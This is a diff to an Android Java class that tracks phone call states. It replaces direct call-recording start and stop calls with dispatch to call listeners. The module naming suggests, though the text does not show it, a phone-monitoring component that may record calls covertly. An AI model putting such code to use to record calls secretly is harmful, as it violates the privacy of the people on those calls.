@@ -106,15 +106,9 @@ public class BroadcastMonitorCall  {
 					if (call != null) {
 						call.setOngoing(false);
 						call.setComplete(incoming ? true : false);
-						//ListenerCall.self().dispatch(call);
-						// Let's start with call recording
-						if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag() ) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (manageReceive): stopping call"); //$NON-NLS-1$
-							}
-							RecordCall.self().stopCall();
-							ongoing_number="";
-						}
+						// tell every listeners that a call has ended
+						ListenerCall.self().dispatch(call);
+						ongoing_number="";
 					}
 
 				case TelephonyManager.CALL_STATE_OFFHOOK:
@@ -131,13 +125,8 @@ public class BroadcastMonitorCall  {
 						if (call != null) {
 							call.setOngoing(true);
 							call.setOffhook();
-							//ListenerCall.self().dispatch(call);
-							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
-								}
-								RecordCall.self().recordCall(call, incoming);
-							}
+							// tell every listeners that a call is starting
+							ListenerCall.self().dispatch(call);
 						}
 					}
 					break;
@@ -158,14 +147,10 @@ public class BroadcastMonitorCall  {
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(TAG + " (manageReceive) Error: " + ex);
+				if (Cfg.EXCEPTION) {
+					Check.log(ex);
+				}
 			}
 		}
-	}
-
-	public static void stopOnGoingRec() {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (stopOnGoingRec): stopping call due to stop"); //$NON-NLS-1$
-			}
-			RecordCall.self().stopCall();
 	}
 }
